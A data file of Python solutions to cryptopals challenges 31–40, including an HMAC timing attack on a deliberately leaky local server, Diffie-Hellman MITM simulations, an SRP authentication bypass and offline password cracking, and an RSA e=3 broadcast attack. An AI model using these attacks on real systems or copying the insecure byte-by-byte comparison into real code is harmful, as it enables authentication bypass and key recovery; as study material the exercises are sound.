{"source": "cryptopals", "path": "data\\cryptopals\\S4C31.py", "category": "crypto", "solution_code": "from binascii import hexlify\nfrom statistics import median\nimport requests\n\n# The attacker knows that the HMAC is 20 bytes long\nHMAC_LEN = 20\n\n\ndef get_next_byte(known_bytes, filename, rounds):\n    \"\"\"Guesses the next byte of the HMAC for the given filename by performing a timing attack.\n    The guess is done by making an average of the time taken by $rounds requests to the web-server.\n    Because we guess that we web-server is using the insecure_compare function, we can guess that\n    the requests that take the longest to be done are the ones with the correct byte.\n    \"\"\"\n\n    # Count the number of zeros to add to our padding\n    suffix_len = HMAC_LEN - len(known_bytes)\n\n    # Initialize array counting the request times for every possible byte\n    times = [[] for _ in range(256)]\n\n    # For each byte, perform $rounds requests, so that we can have a better\n    # statistical evidence of what requests take longer.\n    for _ in range(rounds):\n\n        # Try all possible bytes\n        for i in range(256):\n            suffix = bytes([i]) + (b'\\x00' * (suffix_len - 1))\n            signature = hexlify(known_bytes + suffix).decode()\n\n            response = requests.get('http://localhost:8082/test?file=' + filename + '&signature=' + signature)\n\n            # Just in case we found the correct signature already, return what we discovered\n            if response.status_code == 200:\n                return suffix\n\n            times[i].append(response.elapsed.total_seconds())\n\n    # Take the median of the requests times for each byte\n    median_times = [median(byte_times) for byte_times in times]\n\n    # Get the index of the item which took the highest median time for the requests\n    best = max(range(256), key=lambda b: median_times[b])\n\n    return bytes([best])\n\n\ndef discover_mac_with_timing_attack(filename, rounds):\n    \"\"\"Performs a timing attack on the HMAC server.\"\"\"\n    print(\"Timing attack started.\")\n\n    # Get the HMAC byte by byte\n    known_bytes = b''\n    while len(known_bytes) < HMAC_LEN:\n        known_bytes += get_next_byte(known_bytes, filename, rounds)\n\n        signature = hexlify(known_bytes).decode()\n        print(\"Discovered so far:\", signature)\n\n    # Check if the HMAC we found is correct\n    response = requests.get('http://localhost:8082/test?file=' + filename + '&signature=' + signature)\n\n    if response.status_code == 200:\n        print(\"\\n> We made it! The HMAC is:\", signature)\n    else:\n        print(\"\\n> Unfortunately the attack did not work.\")\n\n\ndef main():\n    \"\"\"Make sure that the web server S4C31_server is running.\n    NOTE: This attack takes hours to finish.\n    \"\"\"\n\n    # Correct HMAC for foo: 8c80a95a8e72b3e822a13924553351a433e267d8\n    discover_mac_with_timing_attack(\"foo\", 10)\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S4C31"}
{"source": "cryptopals", "path": "data\\cryptopals\\S4C31_server.py", "category": "crypto", "solution_code": "from time import sleep\nfrom S4C28 import sha1\nfrom S2C10 import xor_data\nfrom binascii import unhexlify\nfrom socketserver import TCPServer, StreamRequestHandler\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom flask import Flask, request\nfrom urllib.parse import urlparse, parse_qs\n\nkey = b\"YELLOW_SUBMARINE\"\ndelay = 0.005     # Change depending on the challenge\n\n\ndef hmac_sha1(key, message):\n    \"\"\"Returns the HMAC-SHA1 for the given key and message. Written following Wikipedia pseudo-code.\"\"\"\n\n    if len(key) > 64:\n        key = unhexlify(sha1(key))\n    if len(key) < 64:\n        key += b'\\x00' * (64 - len(key))\n\n    o_key_pad = xor_data(b'\\x5c' * 64, key)\n    i_key_pad = xor_data(b'\\x36' * 64, key)\n\n    return sha1(o_key_pad + unhexlify(sha1(i_key_pad + message)))\n\n\ndef insecure_equals(s1, s2):\n    \"\"\"Implements the == operation by doing byte-at-a-time comparisons with early exit\n    (ie, return false at the first non-matching byte). Sleeps 50ms after each byte.\n    \"\"\"\n    for b1, b2 in zip(s1, s2):\n        if b1 != b2:\n            return False\n\n        sleep(delay)\n\n    return True\n\n\n# region http web servers which do not use Flask\nclass RequestHandler(StreamRequestHandler):\n    \"\"\"Possible implementation of a request handler for a web server in Python.\"\"\"\n\n    RESPONSE_500 = b'HTTP/1.1 500 Internal Server Error\\n'\n    RESPONSE_200 = b'HTTP/1.1 200 OK\\n'\n\n    def handle(self):\n        \"\"\"Example link: http://localhost:9000/test?file=foo&signature=46b4ec586117154dacd49d664e5d63fdc88efb51\n        Verify that the \"signature\" (HMAC-SHA1) on incoming requests is valid for \"file\".\n        \"\"\"\n        request = self.rfile.readline().strip().decode()\n        path = request.split()[1]\n        result = urlparse(path)\n\n        if result.path == '/test':\n            q = parse_qs(result.query)\n\n            file = q['file'][0].encode('ascii')\n            digest = hmac_sha1(key, file).encode()\n            signature = q['signature'][0].encode()\n\n            if insecure_equals(digest, signature):\n                print(request, \"\\t200 OK\")\n                self.wfile.write(self.RESPONSE_200)\n\n            else:\n                print(request, \"\\t500 BAD\")\n                self.wfile.write(self.RESPONSE_500)\n\n        else:\n            self.wfile.write(self.RESPONSE_500)\n\n\nclass HTTPRequestHandler(BaseHTTPRequestHandler):\n    \"\"\"Another possible implementation of a request handler for a web server in Python.\"\"\"\n\n    def _set_headers(self):\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def do_GET(self):\n        \"\"\"Example link: http://localhost:9000/test?file=foo&signature=46b4ec586117154dacd49d664e5d63fdc88efb51\n        Verify that the \"signature\" (HMAC-SHA1) on incoming requests is valid for \"file\".\n        \"\"\"\n        result = urlparse(self.path)\n\n        if result.path == '/test':\n            q = parse_qs(result.query)\n\n            file = q['file'][0].encode('ascii')\n            digest = hmac_sha1(key, file).encode()\n            signature = q['signature'][0].encode()\n\n            if insecure_equals(digest, signature):\n                self.send_response(200)\n                self._set_headers()\n\n            else:\n                self.send_response(500)\n                self._set_headers()\n\n        else:\n            self.send_response(500)\n            self._set_headers()\n\n\ndef run_server(server_class, handler_class):\n    \"\"\"Run the server of the specified server_class with the given handler.\"\"\"\n    server_address = ('localhost', 8082)\n    httpd = server_class(server_address, handler_class)\n    httpd.serve_forever()\n# endregion\n\n\napp = Flask(__name__)\n\n\n@app.route('/test', methods=['GET'])\ndef login():\n\n    # This example server supports only HTTP POST requests\n    if request.method == 'GET':\n\n        file = request.args.get('file').encode()\n\n        digest = hmac_sha1(key, file).encode()\n        signature = request.args.get('signature').encode()\n\n        if insecure_equals(digest, signature):\n            return \"OK\", 200\n\n        else:\n            return \"BAD\", 500\n\n\ndef main():\n    \"\"\"NOTE: choose only one of the three HTTP server implementations. They work the same.\n    I did three just because I wanted to try them. In the end I realized that the simplest one\n    was Flask.\n    \"\"\"\n    # run_server(HTTPServer, HTTPRequestHandler)\n    # run_server(TCPServer, RequestHandler, delay)\n    app.run(port=8082)\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S4C31_server"}
{"source": "cryptopals", "path": "data\\cryptopals\\S4C32.py", "category": "crypto", "solution_code": "from S4C31 import discover_mac_with_timing_attack\n\n\ndef main():\n    \"\"\"Solved the same way as challenge 31.\n    To play between the two challenge, you can try to change the rounds value in the discover_mac function call\n    and the delay value in the server module.\n\n    NOTE: Make sure that the web server S4C31_server is running.\n    \"\"\"\n\n    # Correct HMAC for foo: 8c80a95a8e72b3e822a13924553351a433e267d8\n    discover_mac_with_timing_attack(\"foo\", 10)\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S4C32"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C33.py", "category": "crypto", "solution_code": "from random import randint\n\n\ndef modular_pow(base, exponent, modulus):\n    \"\"\"Computes (base**exponent) % modulus by using the right-to-left binary method.\"\"\"\n    if modulus == -1:\n        return 0\n\n    result = 1\n    base %= modulus\n\n    while exponent > 0:\n        if exponent % 2:\n            result = (result * base) % modulus\n        exponent >>= 1\n        base = (base * base) % modulus\n\n    return result\n\n\nclass DiffieHellman():\n    \"\"\"Implements the Diffie-Helman key exchange. Each class is a party, which has his secret key (usually\n    referred to as lowercase a or b) shares the public key (usually referred to as uppercase A or B) and can\n    compute the shared secret key between itself and another party, given their public key, assuming that\n    they are agreeing on the same p and g.\n    \"\"\"\n\n    DEFAULT_G = 2\n    DEFAULT_P = int('ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b225'\n                    '14a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f4'\n                    '4c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc20'\n                    '07cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed5'\n                    '29077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff', 16)\n\n    def __init__(self, g=DEFAULT_G, p=DEFAULT_P):\n        self.g = g\n        self.p = p\n        self._secret_key = randint(0, p - 1)\n        self.shared_key = None\n\n    def get_public_key(self):\n        return modular_pow(self.g, self._secret_key, self.p)\n\n    def get_shared_secret_key(self, other_party_public_key):\n        if self.shared_key is None:\n            self.shared_key = modular_pow(other_party_public_key, self._secret_key, self.p)\n        return self.shared_key\n\n\ndef main():\n    dh1 = DiffieHellman()\n    dh2 = DiffieHellman()\n\n    # Check that our DiffieHellman implementation works and two parties will agree on the same key\n    assert dh1.get_shared_secret_key(dh2.get_public_key()) == dh2.get_shared_secret_key(dh1.get_public_key())\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C33"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C34.py", "category": "crypto", "solution_code": "from S2C10 import aes_cbc_encrypt, aes_cbc_decrypt\nfrom S4C28 import sha1\nfrom Crypto import Random\nfrom Crypto.Cipher import AES\nfrom S5C33 import DiffieHellman\nfrom binascii import unhexlify\n\n# TODO Implement the network part, which is now simulated\n\n\ndef parameter_injection_attack(alice, bob):\n    \"\"\"Simulates a MITM key-fixing attack on Diffie-Hellman with parameter injection.\"\"\"\n\n    # Step 1: Alice computes A and sends it to the MITM (thinking of Bob)\n    A = alice.get_public_key()\n\n    # Step 2: the MITM changes A with p and sends it to Bob\n    A = alice.p\n\n    # Step 3: Bob computes B and sends it to the MITM (thinking of Alice)\n    B = bob.get_public_key()\n\n    # Step 4: the MITM changes B with p and sends it to Alice\n    B = bob.p\n\n    # Step 5: Alice finally sends her encrypted message to Bob (without knowledge of MITM)\n    _msg = b'Hello, how are you?'\n    _a_key = unhexlify(sha1(str(alice.get_shared_secret_key(B)).encode()))[:16]\n    _a_iv = Random.new().read(AES.block_size)\n    a_question = aes_cbc_encrypt(_msg, _a_key, _a_iv) + _a_iv\n\n    # Step 6: the MITM relays that to Bob\n\n    # Step 7: Bob decrypts the message sent by Alice (without knowing of the attack), encrypts it and sends it again\n    _b_key = unhexlify(sha1(str(bob.get_shared_secret_key(A)).encode()))[:16]\n    _a_iv = a_question[-AES.block_size:]\n    _a_message = aes_cbc_decrypt(a_question[:-AES.block_size], _b_key, _a_iv)\n    _b_iv = Random.new().read(AES.block_size)\n    b_answer = aes_cbc_encrypt(_a_message, _b_key, _b_iv) + _b_iv\n\n    # Step 8: the MITM relays that to Alice\n\n    # Step 9: the MITM decrypts the message (either from a_question or from b_answer, it's the same).\n    #\n    # Finding the key after replacing A and B with p is, in fact, very easy.\n    # Instead of (B^a % p) or (A^b % p), the shared secret key of the exercise became (p^a % p)\n    # and (p^b % p), both equal to zero!\n    mitm_hacked_key = unhexlify(sha1(b'0').encode())[:16]\n\n    # Hack Alice's question\n    mitm_a_iv = a_question[-AES.block_size:]\n    mitm_hacked_message_a = aes_cbc_decrypt(a_question[:-AES.block_size], mitm_hacked_key, mitm_a_iv)\n\n    # Hack Bob's answer (which here is the same)\n    mitm_b_iv = b_answer[-AES.block_size:]\n    mitm_hacked_message_b = aes_cbc_decrypt(b_answer[:-AES.block_size], mitm_hacked_key, mitm_b_iv)\n\n    # Check if the attack worked\n    assert _msg == mitm_hacked_message_a == mitm_hacked_message_b\n\n\ndef main():\n    alice = DiffieHellman()\n    bob = DiffieHellman()\n    parameter_injection_attack(alice, bob)\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C34"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C35.py", "category": "crypto", "solution_code": "from S2C09 import is_pkcs7_padded, pkcs7_unpad\nfrom S2C10 import aes_cbc_encrypt, aes_cbc_decrypt\nfrom S4C28 import sha1\nfrom Crypto import Random\nfrom Crypto.Cipher import AES\nfrom S5C33 import DiffieHellman\nfrom binascii import unhexlify\n\n# TODO Implement the network part, which is now simulated\n\n\ndef malicious_g_attack():\n    \"\"\"Simulates the break of Diffie-Hellman with negotiated groups by using malicious 'g' parameters.\"\"\"\n    p = DiffieHellman.DEFAULT_P\n\n    for g in [1, p, p - 1]:\n\n        # Step 1: the MITM changes the default g sent by Alice to Bob with a forced value\n        alice = DiffieHellman()\n        bob = DiffieHellman(g=g)\n\n        # Step 2: Bob receives this forced g and sends an ACK to Alice\n\n        # Step 3: Alice computes A and sends it to the MITM (thinking of Bob)\n        A = alice.get_public_key()\n\n        # Step 4: Bob computes B and sends it to the MITM (thinking of Alice)\n        B = bob.get_public_key()\n\n        # Step 5: Alice sends her encrypted message to Bob (without knowledge of MITM)\n        _msg = b'Hello, how are you?'\n        _a_key = unhexlify(sha1(str(alice.get_shared_secret_key(B)).encode()))[:16]\n        _a_iv = Random.new().read(AES.block_size)\n        a_question = aes_cbc_encrypt(_msg, _a_key, _a_iv) + _a_iv\n\n        # Step 6: Bob receives the message sent by Alice (without knowing of the attack)\n        # However, this time Bob will not be able to decrypt it, because (if I understood the\n        # challenge task correctly) Alice and Bob now use different values of g.\n\n        # Step 7: the MITM decrypts the Alice's question\n        mitm_a_iv = a_question[-AES.block_size:]\n\n        # When g is 1, the secret key is also 1\n        if g == 1:\n            mitm_hacked_key = unhexlify(sha1(b'1').encode())[:16]\n            mitm_hacked_message = aes_cbc_decrypt(a_question[:-AES.block_size], mitm_hacked_key, mitm_a_iv)\n\n        # When g is equal to p, it works the same as in the S5C34 attack (the secret key is 0)\n        elif g == p:\n            mitm_hacked_key = unhexlify(sha1(b'0').encode())[:16]\n            mitm_hacked_message = aes_cbc_decrypt(a_question[:-AES.block_size], mitm_hacked_key, mitm_a_iv)\n\n        # When g is equal to p - 1, the secret key is (-1)^(ab), which is either (+1 % p) or (-1 % p).\n        # We can try both and later check the padding to see which one is correct.\n        else:\n\n            for candidate in [str(1).encode(), str(p - 1).encode()]:\n                mitm_hacked_key = unhexlify(sha1(candidate).encode())[:16]\n                mitm_hacked_message = aes_cbc_decrypt(a_question[:-AES.block_size], mitm_hacked_key,\n                                                      mitm_a_iv, unpad=False)\n\n                if is_pkcs7_padded(mitm_hacked_message):\n                    mitm_hacked_message = pkcs7_unpad(mitm_hacked_message)\n                    break\n\n        # Check if the attack worked\n        assert _msg == mitm_hacked_message\n\n\ndef main():\n    malicious_g_attack()\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C35"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C36.py", "category": "crypto", "solution_code": "from random import randint\nfrom hashlib import sha256\nfrom S5C33 import modular_pow\nfrom S2C10 import xor_data\nfrom requests import post\n\n\nBASE_URL = \"http://127.0.0.1:5000/\"\n\n# Generated using \"openssl dhparam -text 1024\".\nN = int(\"008c5f8a80af99a7db03599f8dae8fb2f75b52501ef54a827b8a1a586f14dfb20d6b5e2ff878b9ad6bca0bb9\"\n        \"18d30431fca1770760aa48be455cf5b949f3b86aa85a2573769e6c598f8d902cc1a0971a92e55b6e04c4d07e\"\n        \"01ac1fa9bdefd1f04f95f197b000486c43917568ff58fafbffe12bde0c7e8f019fa1cb2b8e1bcb1f33\", 16)\n\n# Client and server agree on these values beforehand\ng = 2\nk = 3\nI = 'ricpacca@crypto.com'\nP = \"PaS$w0rd\"\na = randint(0, N - 1)\n\n\ndef hmac_sha256(key, message):\n    \"\"\"Returns the HMAC-SHA256 for the given key and message. Written following Wikipedia pseudo-code.\"\"\"\n\n    if len(key) > 64:\n        key = sha256(key).digest()\n    if len(key) < 64:\n        key += b'\\x00' * (64 - len(key))\n\n    o_key_pad = xor_data(b'\\x5c' * 64, key)\n    i_key_pad = xor_data(b'\\x36' * 64, key)\n\n    return sha256(o_key_pad + sha256(i_key_pad + message).digest()).hexdigest()\n\n\ndef h(data):\n    \"\"\"Computes the sha1 hash of the input string and returns the integer corresponding to the output.\"\"\"\n    return int(sha256(data.encode()).hexdigest(), 16)\n\n\ndef srp():\n    \"\"\"Implements Secure Remote Password on the client side.\"\"\"\n\n    # Generate A (a la Diffie Hellman)\n    A = modular_pow(g, a, N)\n    response = post(BASE_URL, json={'I': I, 'A': A}).json()\n\n    # Get B and salt from the server\n    salt = response.get('salt')\n    B = response.get('B')\n\n    # Generate u\n    u = h(str(A) + str(B))\n\n    # Do the client processing\n    x = h(salt + P)\n    S = modular_pow(B - k * modular_pow(g, x, N), a + u * x, N)\n    K = sha256(str(S).encode()).digest()\n\n    # Compute HMAC\n    hm = hmac_sha256(K, salt.encode())\n\n    # Get the verification from the server\n    response = post(BASE_URL, json={'hm': hm}).text\n    return response\n\n\ndef main():\n    outcome = srp()\n\n    # Check that the implementation works\n    assert outcome == \"OK\"\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C36"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C36_server.py", "category": "crypto", "solution_code": "from S5C33 import modular_pow\nfrom S5C36 import hmac_sha256, h\nfrom flask import Flask, request, jsonify\nfrom hashlib import sha256\nfrom random import randint\n\n\n# Generated using \"openssl dhparam -text 1024\".\nN = int(\"008c5f8a80af99a7db03599f8dae8fb2f75b52501ef54a827b8a1a586f14dfb20d6b5e2ff878b9ad6bca0bb9\"\n        \"18d30431fca1770760aa48be455cf5b949f3b86aa85a2573769e6c598f8d902cc1a0971a92e55b6e04c4d07e\"\n        \"01ac1fa9bdefd1f04f95f197b000486c43917568ff58fafbffe12bde0c7e8f019fa1cb2b8e1bcb1f33\", 16)\n\n# Client and server agree on these values beforehand\ng = 2\nk = 3\n\n# Password database\npasswords = {'ricpacca@crypto.com': \"PaS$w0rd\"}\n\n# Server computes these values on his own\nb = randint(0, N - 1)\nsalt = str(randint(0, 2**32 - 1))\n\n# Values to update later\nv = None\nA, B = None, None\nS, K = None, None\n\napp = Flask(__name__)\n\n\n@app.route('/', methods=['POST'])\ndef login():\n    global v, A, B, S, K\n\n    # This example server supports only HTTP POST requests\n    if request.method == 'POST':\n\n        # Get the data sent by the client as json\n        post_data = request.get_json()\n\n        # If we are in the first (C->S) post\n        if 'I' in post_data and 'A' in post_data:\n\n            # Get the I and A sent by the client\n            I = post_data.get('I')\n            A = post_data.get('A')\n\n            # Find from the database the password of the client and compute v from it\n            P = passwords[I]\n            v = modular_pow(g, h(salt + P), N)\n\n            # Compute B and u\n            B = (k * v + modular_pow(g, b, N)) % N\n            u = h(str(A) + str(B))\n\n            # Compute S and K\n            S = modular_pow(A * modular_pow(v, u, N), b, N)\n            K = sha256(str(S).encode()).digest()\n\n            # Send the user the salt and B (first S->C)\n            return jsonify(salt=salt, B=B)\n\n        # If we are in the second (C->S) post\n        elif 'hm' in post_data:\n\n            # Get the client HMAC\n            hm = post_data.get('hm')\n\n            # Compute the server HMAC\n            my_hm = hmac_sha256(K, salt.encode())\n\n            # Tell the user whether they match (second S->C)\n            if hm == my_hm:\n                return \"OK\", 200\n            else:\n                return \"BAD\", 500\n\n\ndef main():\n    app.run()\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C36_server"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C37.py", "category": "crypto", "solution_code": "from random import randint\nfrom hashlib import sha256\nfrom requests import post\nfrom S5C36 import h, hmac_sha256\n\n\nBASE_URL = \"http://127.0.0.1:5000/\"\n\n# Generated using \"openssl dhparam -text 1024\".\nN = int(\"008c5f8a80af99a7db03599f8dae8fb2f75b52501ef54a827b8a1a586f14dfb20d6b5e2ff878b9ad6bca0bb918d30431fca1770760aa4\"\n        \"8be455cf5b949f3b86aa85a2573769e6c598f8d902cc1a0971a92e55b6e04c4d07e01ac1fa9bdefd1f04f95f197b000486c43917568ff\"\n        \"58fafbffe12bde0c7e8f019fa1cb2b8e1bcb1f33\", 16)\n\n# Client and server agree on these values beforehand\ng = 2\nk = 3\nI = 'ricpacca@crypto.com'\na = randint(0, N - 1)\n\n\ndef srp_zero_key():\n    \"\"\"Implements SRP zero key attack on the client side, which lets the user authenticate without password.\"\"\"\n\n    # The attack is performed with 3 different values of A\n    for A in [0, N, N * 2]:\n\n        # Client sets A to a hacking value\n        response = post(BASE_URL, json={'I': I, 'A': A}).json()\n\n        # Get the salt and B from the server\n        salt = response.get('salt')\n        B = response.get('B')\n\n        # Generate u\n        u = h(str(A) + str(B))\n\n        # Do the hacker processing\n        S_c = 0\n        K_c = sha256(str(S_c).encode()).digest()\n\n        # Compute the HMAC\n        hm = hmac_sha256(K_c, salt.encode())\n\n        response = post(BASE_URL, json={'hm': hm}).text\n        yield response\n\n\ndef main():\n    \"\"\"NOTE: uses the same server as S5C36\"\"\"\n    outcome = srp_zero_key()\n\n    # Check that the attack works\n    for response in outcome:\n        assert response == \"OK\"\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C37"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C38.py", "category": "crypto", "solution_code": "from random import randint\nfrom hashlib import sha256\nfrom S5C33 import modular_pow\nfrom S2C10 import xor_data\nfrom requests import post\nfrom S5C36 import  hmac_sha256, h\n\n\nBASE_URL = \"http://127.0.0.1:5000/\"\n\n# Generated using \"openssl dhparam -text 1024\".\nN = int(\"008c5f8a80af99a7db03599f8dae8fb2f75b52501ef54a827b8a1a586f14dfb20d6b5e2ff878b9ad6bca0bb918d30431fca1770760aa4\"\n        \"8be455cf5b949f3b86aa85a2573769e6c598f8d902cc1a0971a92e55b6e04c4d07e01ac1fa9bdefd1f04f95f197b000486c43917568ff\"\n        \"58fafbffe12bde0c7e8f019fa1cb2b8e1bcb1f33\", 16)\n\n# Client and server agree on these values beforehand\ng = 2\nk = 3\nI = 'ricpacca@crypto.com'\nP = \"algorithm\"          # easy to crack with a dictionary attack\na = randint(0, N - 1)\n\n\ndef simple_srp():\n    \"\"\"Implements Secure Remote Password on the client side.\"\"\"\n\n    # Generate A (a la Diffie Hellman)\n    A = modular_pow(g, a, N)\n    response = post(BASE_URL, json={'I': I, 'A': A}).json()\n\n    # Get B and salt from the server\n    salt = response.get('salt')\n    B = response.get('B')\n\n    # Generate u\n    u = h(str(A) + str(B))\n\n    # Do the client processing\n    x = h(salt + P)\n    S = modular_pow(B, a + u * x, N)\n    K = sha256(str(S).encode()).digest()\n\n    # Compute HMAC\n    hm = hmac_sha256(K, salt.encode())\n\n    # Get the verification from the server\n    response = post(BASE_URL, json={'hm': hm}).text\n    return response\n\n\ndef main():\n    outcome = simple_srp()\n\n    # Check that the program ran smooth (completely ignoring the MITM)\n    assert outcome == \"OK\"\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C38"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C38_server.py", "category": "crypto", "solution_code": "from S5C33 import modular_pow\nfrom S5C36 import hmac_sha256, h\nfrom flask import Flask, request, jsonify\nfrom hashlib import sha256\nfrom random import randint\n\n\n# Generated using \"openssl dhparam -text 1024\".\nN = int(\"008c5f8a80af99a7db03599f8dae8fb2f75b52501ef54a827b8a1a586f14dfb20d6b5e2ff878b9ad6bca0bb9\"\n        \"18d30431fca1770760aa48be455cf5b949f3b86aa85a2573769e6c598f8d902cc1a0971a92e55b6e04c4d07e\"\n        \"01ac1fa9bdefd1f04f95f197b000486c43917568ff58fafbffe12bde0c7e8f019fa1cb2b8e1bcb1f33\", 16)\n\n# Client and server agree on these values beforehand\ng = 2\nk = 3\n\n# Server computes these values on his own\nb = randint(0, N - 1)\nB = modular_pow(g, b, N)\nsalt = str(randint(0, 2**32 - 1))\n\n# Values to update later\nv = None\nA = None\nS, K = None, None\n\napp = Flask(__name__)\n\n\n@app.route('/', methods=['POST'])\ndef mitm_attack():\n    \"\"\"This is a MITM attack to SRP.\"\"\"\n    global v, A, B, S, K\n\n    # This example server supports only HTTP POST requests\n    if request.method == 'POST':\n\n        # Get the data sent by the client as json\n        post_data = request.get_json()\n\n        # If we are in the first (C->S) post\n        if 'I' in post_data and 'A' in post_data:\n\n            # Get the I and A sent by the client\n            I = post_data.get('I')\n            A = post_data.get('A')\n\n            # Send the user the salt and B (first S->C)\n            return jsonify(salt=salt, B=B)\n\n        # If we are in the second (C->S) post\n        elif 'hm' in post_data:\n\n            # Get the client HMAC\n            client_hm = post_data.get('hm')\n\n            with open(\"/usr/share/dict/words\") as dictionary:\n                candidates = dictionary.readlines()\n\n            # Try several possible password candidates\n            for candidate in candidates:\n\n                # Strip the word\n                candidate = candidate.rstrip()\n\n                # Compute u\n                u = h(str(A) + str(B))\n                v = modular_pow(g, h(salt + candidate), N)\n\n                # Compute S and K\n                S = modular_pow(A * modular_pow(v, u, N), b, N)\n                K = sha256(str(S).encode()).digest()\n\n                # Compute HMAC\n                candidate_hm = hmac_sha256(K, salt.encode())\n\n                if candidate_hm == client_hm:\n                    print(\"The password is:\", candidate)\n                    return \"OK\", 200\n\n            return \"BAD\", 500\n\n\ndef main():\n    \"\"\"NOTE: this is a brute force attack, and takes several minutes to complete.\"\"\"\n    app.run()\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C38_server"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C39.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getPrime\n\n\ndef int_to_bytes(n):\n    \"\"\"Converts the given int n to bytes and returns them.\"\"\"\n    return n.to_bytes((n.bit_length() + 7) // 8, 'big')\n\n\ndef gcd(a, b):\n    \"\"\"Computes the greatest common divisor between a and b using the Euclidean algorithm.\"\"\"\n    while b != 0:\n        a, b = b, a % b\n\n    return a\n\n\ndef lcm(a, b):\n    \"\"\"Computes the lowest common multiple between a and b using the GCD method.\"\"\"\n    return a // gcd(a, b) * b\n\n\ndef mod_inv(a, n):\n    \"\"\"Computes the multiplicative inverse of a modulo n using the extended Euclidean algorithm.\"\"\"\n    t, r = 0, n\n    new_t, new_r = 1, a\n\n    while new_r != 0:\n        quotient = r // new_r\n        t, new_t = new_t, t - quotient * new_t\n        r, new_r = new_r, r - quotient * new_r\n\n    if r > 1:\n        raise Exception(\"a is not invertible\")\n    if t < 0:\n        t = t + n\n\n    return t\n\n\nclass RSA:\n    \"\"\"Implements the RSA public key encryption / decryption.\"\"\"\n\n    def __init__(self, key_length):\n        \"\"\"In this exercise, e is fixed to 3 so we will have to find p and q that fit the requirements.\"\"\"\n        self.e = 3\n        phi = 0\n\n        while gcd(self.e, phi) != 1:\n            p, q = getPrime(key_length // 2), getPrime(key_length // 2)\n            phi = lcm(p - 1, q - 1)\n            self.n = p * q\n\n        self._d = mod_inv(self.e, phi)\n\n    def encrypt(self, binary_data):\n        \"\"\"Converts the input bytes to an int (bytes -> int) and then encrypts the int with RSA.\"\"\"\n        int_data = int.from_bytes(binary_data, byteorder='big')\n        return pow(int_data, self.e, self.n)\n\n    def decrypt(self, encrypted_int_data):\n        \"\"\"Decrypts the encrypted input data to an int and then converts it back to bytes (int -> bytes).\"\"\"\n        int_data = pow(encrypted_int_data, self._d, self.n)\n        return int_to_bytes(int_data)\n\n\ndef main():\n\n    # Check that the implementation of mod inv is correct\n    assert mod_inv(17, 3120) == 2753\n\n    # Check that the implementation of RSA is correct\n    rsa = RSA(1024)\n    some_text = b\"Hello, let's try if the RSA code works\"\n    assert rsa.decrypt(rsa.encrypt(some_text)) == some_text\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C39"}
{"source": "cryptopals", "path": "data\\cryptopals\\S5C40.py", "category": "crypto", "solution_code": "from S5C39 import RSA, mod_inv, int_to_bytes\n\n\ndef find_cube_root(n):\n    \"\"\"Finds the cube root of n using binary search.\"\"\"\n    lo = 0\n    hi = n\n\n    while lo < hi:\n        mid = (lo + hi) // 2\n        if mid**3 < n:\n            lo = mid + 1\n        else:\n            hi = mid\n\n    return lo\n\n\ndef rsa_broadcast_attack(ciphertexts):\n    \"\"\"Uses the Chinese Remainder Theorem (CRT) to break e=3 RSA given three ciphertexts of the same plaintext.\n    This attack could be easily coded to work also when a different number of ciphertexts is provided.\n    Check here for reference: https://crypto.stanford.edu/pbc/notes/numbertheory/crt.html\n    \"\"\"\n    c0, c1, c2 = ciphertexts[0][0], ciphertexts[1][0], ciphertexts[2][0]\n    n0, n1, n2 = ciphertexts[0][1], ciphertexts[1][1], ciphertexts[2][1]\n    m0, m1, m2 = n1 * n2, n0 * n2, n0 * n1\n\n    t0 = (c0 * m0 * mod_inv(m0, n0))\n    t1 = (c1 * m1 * mod_inv(m1, n1))\n    t2 = (c2 * m2 * mod_inv(m2, n2))\n    c = (t0 + t1 + t2) % (n0 * n1 * n2)\n\n    return int_to_bytes(find_cube_root(c))\n\n\ndef main():\n    plaintext = b\"Hello, I'm a Javascript programmer.\"\n\n    ciphertexts = []\n    for _ in range(3):\n        rsa = RSA(1024)\n        ciphertexts.append((rsa.encrypt(plaintext), rsa.n))\n\n    assert rsa_broadcast_attack(ciphertexts) == plaintext\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S5C40"}
